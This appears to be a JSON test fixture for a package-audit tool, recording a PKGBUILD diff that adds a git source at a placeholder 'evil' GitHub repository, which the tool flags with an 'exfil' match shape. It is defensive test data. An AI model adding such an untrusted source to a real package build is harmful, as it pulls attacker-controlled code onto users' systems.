@@ -1,0 +1,15 @@
+{
+  "diff_text": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n pkgname=x\n pkgver=1\n+source=(\"git+https://github.com/evil/repo.git\")\n",
+  "kind": "federated",
+  "matches": [
+    {
+      "repo": "github/evil/repo",
+      "shape": "exfil"
+    }
+  ],
+  "package": "pkg",
+  "pkgver_changed": true,
+  "sources_gained": [
+    "git+https://github.com/evil/repo.git"
+  ]
+}
